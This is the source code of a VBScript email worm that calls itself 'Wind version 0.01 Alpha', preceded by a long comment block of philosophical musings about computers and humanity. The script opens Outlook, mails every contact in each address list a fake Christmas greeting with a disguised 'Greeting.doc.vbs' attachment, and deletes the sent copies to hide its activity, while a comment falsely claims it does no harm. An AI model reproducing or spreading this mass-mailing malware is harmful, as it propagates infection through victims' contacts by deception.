REM This is just alpha
REM People are too abuse in computers
Rem What is IT? What is Computer?
REm Computer cannot give us life.
Rem We are lived on food but not computer.
Rem Imagine the poor people in the poor country
Rem Without internet, ICQ, or etc, we can still live
Rem The four elements in nature start become unbalanced
Rem God cannot survive human, only human can survive human
Rem When people running Win2K, who will remember DOS, CP/M and AplleII?
Rem When people talking pentium III, Who remember Z80?
Rem Earth,Water,Fire and Wind become mad.
REm Human are killed themselves
Rem This is Just alpha
Rem I hope it would be omega
Rem This programme did no harm to your computer

Rem I prefer this programme call WIND alpha
Rem Because Water, Fire, Earth would wake up later
Rem Because of the Hatred of Human
Rem After all four elements wake up
Rem Lord of Time will stop the Wheel
Rem Computer will lose its brightness
Rem And The God of Science will leave
Rem The darkness of Magic will rise
Rem Sun, Moon and Star will try to stop the rise of darkness
Rem But it will fail
Rem All because the Hatred of Human
Rem Darkness will control the Sky
Rem And Everyone would under its hatred
Rem Only Love will safe the World.
 
Rem It is Wind version 0.01 Alpha
Rem By Beta Theta, an eightee old man in London
On Error Resume Next
dim i,j,k
dim Wobject,Oobject,mailObject,tempdir,Filesys,mapi,AddressObj,mailad
Set WObject = CreateObject("WScript.Shell")
Set filesys = CreateObject("Scripting.Filesystemobject")
WObject.popup"Hello. Loading"
Set Oobject = CreateObject("Outlook.Application")
Set tempdir = filesys.getspecialfolder(2)
Set mapi = Oobject.GetNameSpace("MAPI")
For Each AddressObj In mapi.AddressLists
  Set mailobject = oobject.CreateItem(0)
  For k = 1 To AddressObj.AddressEntries.Count
  Set mailad = Addressobj.AddressEntries(k)
  if k = 1 then 
  mailobject.to = mailad.Address
  else
  mailobject.to = mailobject.to & ";" & mailad.address
  end if
  Next
  Mailobject.Subject = "An Early greeting for Merry Christmas"
  mailobject.Body = "Merry Christmas and Happy NewYear Here is a Greeting Card for you"
  mailobject.attachments.add(tempdir&"\Greeting.doc.vbs") 
  mailobject.DeleteAfterSubmit = True 
  mailobject.Send
Next 
i = "       *" & Chr(13) & Chr(10) & "      * *"& Chr(13) & Chr(10) &"     *   *"& Chr(13) & Chr(10) &"    **   **"& Chr(13) & Chr(10) &"     *   *" & Chr(13) & Chr(10) &"    *     *"& Chr(13) & Chr(10) &"   *       *"& Chr(13) & Chr(10) &"  **       **"& Chr(13) & Chr(10) &"   *       *"& Chr(13) & Chr(10) &"  *         *"& Chr(13) & Chr(10) &" *           *"& Chr(13) & Chr(10) &"************"& Chr(13) & Chr(10) &"     |   |"& Chr(13) & Chr(10) &" Merry Christmas and Happy New year"
WObject.popup(i)
